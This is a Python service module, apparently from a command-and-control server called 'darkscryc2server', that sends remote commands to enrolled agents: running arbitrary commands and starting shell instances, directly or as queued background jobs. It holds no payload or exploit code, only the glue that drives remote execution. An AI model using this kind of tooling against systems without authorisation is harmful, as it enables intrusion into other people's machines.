import uuid

from arq.jobs import Job
from darkscryc2server.models.messages import (
    CommandIdentifiers,
    AgentResponse
)
from app.schemas.modules.execution import StartShellCommand, RunCommand
from darkscryc2server.utils.remote_manager import remote_send_command

from ...utils.tasks import get_task_executor


class ExecutionService:
    """Service layer for execution module interactions."""

    async def run_command(self, agent_id: uuid.UUID, command: RunCommand) -> AgentResponse:
        return await remote_send_command(
            agent_id=str(agent_id),
            action_id=CommandIdentifiers.RUN_COMMAND, 
            command=command.model_dump()
        )


    async def start_shell_task(self, agent_id: uuid.UUID, command:StartShellCommand) -> uuid.UUID:
        executor = await get_task_executor()
        job: Job = await executor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent_id),
            action_id=CommandIdentifiers.START_SHELL_INSTANCE,
            command=command.model_dump()
        )
        return uuid.UUID(job.job_id)

    async def run_command_task(self, agent_id: uuid.UUID, command: RunCommand) -> uuid.UUID:
        executor = await get_task_executor()
        job: Job = await executor.enqueue_job(
            "remote_send_command_task",
            agent_id=str(agent_id),
            command=command.model_dump(),
            action_id=CommandIdentifiers.RUN_COMMAND,
        )
        return uuid.UUID(job.job_id)
